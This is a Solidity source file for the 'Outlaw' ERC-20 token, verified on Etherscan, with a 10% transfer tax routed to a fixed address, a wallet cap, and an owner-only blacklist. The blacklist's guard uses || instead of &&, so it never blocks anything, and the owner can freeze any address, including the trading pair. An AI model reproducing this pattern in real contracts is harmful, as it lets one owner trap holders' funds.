/**
 *Submitted for verification at Etherscan.io on 2023-06-24
*/

// SPDX-License-Identifier: Apache-2.0A

pragma solidity 0.8.17;

/*
 * Defi against the establishment.
 *
 * Join the movement. 
 *
 * Become an Outlaw.
 *
 * Twitter @outlawerc
 *
 */

/*
 * OpenZeppelin (abstract) smart contracts, libraries and interfaces used, modified or built upon:
 * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol
 * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/IERC20Metadata.sol
 * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Context.sol
 * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol
 * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol
 *
 * Contract created by @lostmyuwu (VERIFY!)
 */

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


abstract contract Ownable is Context {
    address private _owner;

    /**
     * @dev The caller account is not authorized to perform an operation.
     */
    error OwnableUnauthorizedAccount(address account);

    /**
     * @dev The owner is not a valid owner account. (eg. `address(0)`)
     */
    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


contract Outlaw is Context, IERC20, IERC20Metadata, Ownable {
    event TaxModified(uint256 indexed _newTax);

    mapping(address => bool) private _blacklisted;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    string private _name = "Outlaw";
    string private _symbol = "Outlaw";
    
    uint256 private _tax;
    uint256 private _totalSupply;

    address private _outlaw = 0x40F49a287C46291cBb7Ef6C7D86DfcdFC0a1dC05;
    address private _uniswapV2Pair;
    address private _uniswapV3Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address private _deployer = 0x3B5F8715A53EC2A1b73b93DA92D4384F87bEF05C;
    address private _lostmyuwu = 0x82e5458c4FE35878214275F496559Fc53641C335;

    constructor() {
        _totalSupply = 1000000000000000000000000;
        _balances[_deployer] = 980000000000000000000000;
        emit Transfer(address(0), _deployer, 980000000000000000000000);
        _balances[_lostmyuwu] = 20000000000000000000000;
        emit Transfer(address(0), _lostmyuwu, 20000000000000000000000);
        _transferOwnership(_msgSender());
        _tax = 1000;
    }

    // ERC-20

    function name() external view virtual override returns (string memory) {
        return _name;
    }

    function symbol() external view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() external view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) external virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) external view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }
        
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) private {
        uint256 currentAllowance = _allowances[owner][spender];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (_blacklisted[from] || _blacklisted[to]) {
            revert();
        }

        if (to == _uniswapV2Pair || to == _uniswapV3Router || to == _deployer || from == _deployer) {

        } else {
            require(_balances[to] + amount <= _totalSupply / 50);
        }

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        uint256 tax = amount * _tax / 10000;

        _route(from, _outlaw, tax);
        _route(from, to, amount - tax);
    }

    function _route(address from, address to, uint amount) private {
        uint256 fromBalance = _balances[from];
        
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);
    }

    function setTax(uint256 newTax) external onlyOwner {
        require(newTax <= 1000, "ERC20: tax may not exceed 10%");
        _tax = newTax;
        emit TaxModified(newTax);
    }

    function setPair(address uniswapV2Pair_) external onlyOwner {
        require(_uniswapV2Pair == address(0), "ERC20: Pair already set");
        _uniswapV2Pair = uniswapV2Pair_;
    }

    function blacklist(address blacklisted_) external onlyOwner {
        require(blacklisted_ != _uniswapV2Pair || blacklisted_ != _uniswapV3Router || blacklisted_ != _outlaw || blacklisted_ != _deployer || blacklisted_ != _lostmyuwu, "ERC20: not allowed");
        _blacklisted[blacklisted_] = true;
    }

    function readTax() external view returns (uint256) {
        return _tax;
    }

    function readPair() external view returns (address) {
        return _uniswapV2Pair;
    }

    function readDeployer() external view returns (address) {
        return _deployer;
    }
}